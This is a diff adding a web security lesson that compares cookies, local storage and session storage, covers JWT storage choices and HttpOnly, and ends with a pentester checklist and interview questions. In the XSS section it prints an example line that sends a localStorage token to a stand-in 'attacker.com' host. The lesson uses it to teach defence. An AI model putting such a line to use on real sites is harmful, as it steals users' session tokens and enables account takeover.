@@ -1,0 +1,519 @@
+🌐 Browser Storage (Cookies vs Local Storage vs Session Storage)
+Module: Web Security
+Lesson: Day 10
+
+Introduction
+Modern web applications need to store information inside the user's browser.
+
+Examples include:
+
+Login sessions
+User preferences
+Language settings
+Shopping carts
+JWT tokens
+Browsers provide multiple storage mechanisms for this purpose.
+
+The three most common are:
+
+Cookies
+Local Storage
+Session Storage
+Although all three store data inside the browser, they behave very differently.
+
+Understanding these differences is important because attackers often target browser storage to steal sensitive information.
+
+Browser Storage Overview
+Browser Storage
+
+│
+
+├── Cookies
+
+├── Local Storage
+
+└── Session Storage
+Each storage type has different properties and security implications.
+
+Cookies
+A Cookie is a small piece of data stored inside the browser.
+
+The server usually creates cookies using:
+
+Set-Cookie:
+
+session=abc123
+The browser stores:
+
+session=abc123
+Every future request automatically includes:
+
+Cookie:
+
+session=abc123
+This is why cookies are commonly used for authentication.
+
+Cookie Characteristics
+Cookies:
+
+Stored inside the browser
+Automatically sent with every HTTP request to the same website
+Can have an expiration date
+Usually store Session IDs
+Support security attributes
+Security attributes include:
+
+Secure
+HttpOnly
+SameSite
+Cookie Flow
+User Logs In
+
+↓
+
+Server Creates Session
+
+↓
+
+Server Sends Set-Cookie
+
+↓
+
+Browser Stores Cookie
+
+↓
+
+Future Requests
+
+↓
+
+Cookie Automatically Sent
+
+↓
+
+Server Identifies User
+Local Storage
+Local Storage stores data permanently inside the browser.
+
+Unlike cookies:
+
+It is not automatically sent to the server.
+It can only be accessed through JavaScript.
+Example:
+
+localStorage.setItem("theme","dark");
+Reading the value:
+
+localStorage.getItem("theme");
+Returns:
+
+dark
+Local Storage Characteristics
+Stored in browser
+Accessible through JavaScript
+Not automatically sent to the server
+Survives browser restart
+Shared across tabs of the same origin
+Local Storage Example
+Website saves:
+
+Theme = Dark
+
+Language = English
+User closes browser.
+
+User opens browser tomorrow.
+
+Settings still exist.
+
+Session Storage
+Session Storage works almost exactly like Local Storage.
+
+The main difference:
+
+It only exists while the browser tab remains open.
+
+Example:
+
+sessionStorage.setItem("cart","3 items");
+Close the browser tab.
+
+The data disappears.
+
+Session Storage Characteristics
+Stored in browser
+Accessible through JavaScript
+Not automatically sent to server
+Exists only for one browser tab
+Deleted when the tab closes
+Cookie vs Local Storage vs Session Storage
+Feature	Cookies	Local Storage	Session Storage
+Stored in Browser	✅	✅	✅
+Automatically Sent to Server	✅	❌	❌
+Accessible through JavaScript	Usually (unless HttpOnly)	✅	✅
+Survives Browser Restart	Depends on Expiration	✅	❌
+Shared Across Tabs	Usually	✅	❌
+Where Are JWTs Stored?
+Developers commonly choose one of three locations.
+
+Option 1 — Cookies
+Example:
+
+Cookie:
+
+jwt=eyJhbGc...
+Advantages:
+
+Automatically sent
+Can use HttpOnly
+Can use Secure
+Can use SameSite
+Disadvantages:
+
+Must be protected against CSRF
+Option 2 — Local Storage
+Example:
+
+localStorage.setItem("token",jwt);
+Advantages:
+
+Very easy to use
+Popular in React, Angular and Vue applications
+Disadvantages:
+
+JavaScript can read it.
+
+If an attacker finds an XSS vulnerability:
+
+localStorage.getItem("token");
+The JWT can be stolen.
+
+Option 3 — Session Storage
+Similar to Local Storage.
+
+Difference:
+
+The token disappears after the browser tab closes.
+
+Still accessible through JavaScript.
+
+XSS and Browser Storage
+Suppose a website has an XSS vulnerability.
+
+Attacker executes:
+
+alert(localStorage.getItem("token"));
+The JWT becomes visible.
+
+Even worse:
+
+fetch("https://attacker.com/?token="+localStorage.getItem("token"));
+The attacker steals the token.
+
+This is why storing sensitive authentication tokens in Local Storage increases the impact of XSS.
+
+HttpOnly Cookies
+Suppose the server sends:
+
+Set-Cookie:
+
+session=abc123;
+
+HttpOnly
+Attacker executes:
+
+document.cookie
+Result:
+
+HttpOnly Cookie Not Accessible
+JavaScript cannot read HttpOnly cookies.
+
+This significantly reduces the risk of cookie theft through XSS.
+
+Important Note About HttpOnly
+HttpOnly prevents JavaScript from reading the cookie.
+
+However:
+
+The browser still automatically sends the cookie with requests.
+
+Therefore:
+
+An XSS vulnerability may still perform actions as the logged-in user even though it cannot steal the cookie itself.
+
+HttpOnly protects against cookie theft, not against all consequences of XSS.
+
+When Should Each Storage Be Used?
+Cookies
+Best for:
+
+Authentication
+Sessions
+Login state
+Local Storage
+Best for:
+
+Theme
+Language
+User Preferences
+Dark Mode
+Non-sensitive settings
+Session Storage
+Best for:
+
+Temporary forms
+Shopping carts during one session
+Multi-step forms
+Temporary application data
+Browser Storage Diagram
+Browser
+
+│
+
+├── Cookies
+
+│
+
+│    Automatically Sent
+
+│
+
+├── Local Storage
+
+│
+
+│    Permanent
+
+│
+
+└── Session Storage
+
+      Temporary
+
+      Deleted When Tab Closes
+Common Security Mistakes
+Never store:
+
+Passwords
+Credit Card Numbers
+API Secrets
+inside browser storage.
+
+Common mistakes include:
+
+Missing HttpOnly
+Missing Secure
+Missing SameSite
+Storing sensitive JWTs in Local Storage
+Pentester's Perspective 🔍
+Whenever testing browser storage, ask yourself:
+
+Cookies
+Is HttpOnly enabled?
+Is Secure enabled?
+Is SameSite configured?
+Can the cookie be modified?
+Does the cookie expire?
+Local Storage
+Are JWTs stored here?
+Is sensitive information stored?
+Can XSS steal it?
+Session Storage
+Is authentication information stored?
+Does it disappear after closing the tab?
+Can JavaScript access it?
+Browser Inspection
+Open:
+
+Developer Tools
+
+↓
+
+Application
+
+↓
+
+Storage
+
+↓
+
+Inspect:
+
+Cookies
+Local Storage
+Session Storage
+Always check whether sensitive information is exposed.
+
+Real Burp Suite Example
+Response:
+
+HTTP/1.1 200 OK
+
+Set-Cookie:
+
+session=abc123;
+
+HttpOnly;
+
+Secure;
+
+SameSite=Lax
+Questions to investigate:
+
+Can JavaScript access the cookie?
+Is HTTPS required?
+Is CSRF protection improved through SameSite?
+Does the session expire?
+Next inspect:
+
+localStorage
+If you find:
+
+jwt=eyJhbGc...
+Ask:
+
+Can an XSS vulnerability steal this token?
+
+Interview Questions
+What is Browser Storage?
+Browser Storage refers to mechanisms that allow browsers to store data locally, including Cookies, Local Storage, and Session Storage.
+
+What is the difference between Cookies and Local Storage?
+Cookies are automatically sent with HTTP requests and are commonly used for authentication.
+
+Local Storage is only accessible through JavaScript and is not automatically sent to the server.
+
+What is Session Storage?
+Session Storage stores data only for the lifetime of a browser tab and is deleted when the tab is closed.
+
+Why is storing JWTs in Local Storage risky?
+Because JavaScript can access Local Storage, an XSS vulnerability may allow attackers to steal JWTs.
+
+What does HttpOnly do?
+HttpOnly prevents JavaScript from reading cookies, helping protect against cookie theft through XSS.
+
+Can XSS steal an HttpOnly cookie?
+No.
+
+JavaScript cannot directly read an HttpOnly cookie.
+
+However, XSS may still perform actions as the authenticated user because the browser automatically includes the cookie in requests.
+
+Hands-on Practice
+Open Chrome.
+Press F12.
+Open the Application tab.
+Explore:
+Cookies
+Local Storage
+Session Storage
+Visit a website after logging in.
+Observe:
+Which storage is used?
+Is the session stored in a cookie?
+Is a JWT stored in Local Storage?
+Are HttpOnly, Secure and SameSite enabled?
+Quick Revision
+Browser Storage
+
+↓
+
+Cookies
+
+↓
+
+Authentication
+
+↓
+
+Automatically Sent
+
+↓
+
+Supports
+
+HttpOnly
+
+Secure
+
+SameSite
+
+────────────────────────────
+
+Local Storage
+
+↓
+
+Permanent
+
+↓
+
+JavaScript Accessible
+
+↓
+
+XSS Risk
+
+────────────────────────────
+
+Session Storage
+
+↓
+
+Temporary
+
+↓
+
+Deleted When Tab Closes
+
+↓
+
+JavaScript Accessible
+
+────────────────────────────
+
+JWT Storage
+
+↓
+
+Cookie
+
+↓
+
+Better Protection
+
+(HttpOnly)
+
+OR
+
+↓
+
+Local Storage
+
+↓
+
+Higher XSS Risk
+
+────────────────────────────
+
+Pentester Checklist
+
+↓
+
+Cookies Secure?
+
+↓
+
+HttpOnly Enabled?
+
+↓
+
+JWT in Local Storage?
+
+↓
+
+Sensitive Data Stored?
+
+↓
+
+Can XSS Steal Tokens?
